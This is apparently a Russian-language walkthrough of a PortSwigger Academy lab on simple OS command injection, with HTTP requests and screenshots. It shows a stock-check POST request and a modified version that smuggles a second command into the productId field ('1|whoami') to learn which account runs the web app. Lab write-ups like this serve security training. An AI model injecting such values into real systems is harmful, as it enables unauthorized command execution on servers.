Откроем саму лабораторную работу
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/1.%20OS%20command%20injection%2C%20simple%20case/pics%20for%20walktrough/1.png)

Далее перейдем в отдельную карточку товара
```
GET /product?productId=1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/1.%20OS%20command%20injection%2C%20simple%20case/pics%20for%20walktrough/2.png)
Проверим наличие товара, нажав на кнопку `Check stock`, и видим, что у нас метод `GET` изменился на метод `POST`
```
POST /product/stock
...
productId=1&storeId=2
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/1.%20OS%20command%20injection%2C%20simple%20case/pics%20for%20walktrough/4.png)
Далее воспользуемся уязвимостью, и попробуем узнать название учетной записи, от чьего имени запущен веб ресурс с помощью модификации вводимых параметров
```
POST /product/stock
...
productId=1|whoami&storeId=2
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/1.%20OS%20command%20injection%2C%20simple%20case/pics%20for%20walktrough/3.png)
По полученному пути возможно идентифицировать пользователя
